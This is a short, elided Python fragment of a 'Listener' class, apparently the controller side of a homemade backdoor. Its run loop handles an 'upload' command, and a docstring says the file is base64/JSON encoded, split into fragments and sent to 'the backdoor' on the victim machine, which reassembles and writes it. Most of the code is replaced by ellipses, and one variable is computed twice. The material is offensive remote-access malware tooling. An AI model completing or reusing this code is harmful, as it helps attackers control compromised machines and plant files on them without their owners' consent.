...
class Listener:
	...
	def dodgy_fragmented_send(self, filename, data):
		'''
		in this version I will ascii bytes -> json -> b64 encode the whole file, then send
		the fragments, the backdoor will then receive the fragments, assemble the whole file
		then b64 -> json -> ascii bytes decode it, then write that to the file
		'''

		filesize = self.get_file_size(filename)
		filesize = len(data.encode('utf-8'))
		upload_command = ["upload", filename, filesize]
	...
	def run(self):
		while True:
			...
			try:
				...
				if command[0] == "upload":
					b64_data = self.read_file(command[1])
					json_data = self.json_encode(b64_data)
					self.dodgy_fragmented_send(command[1], json_data)
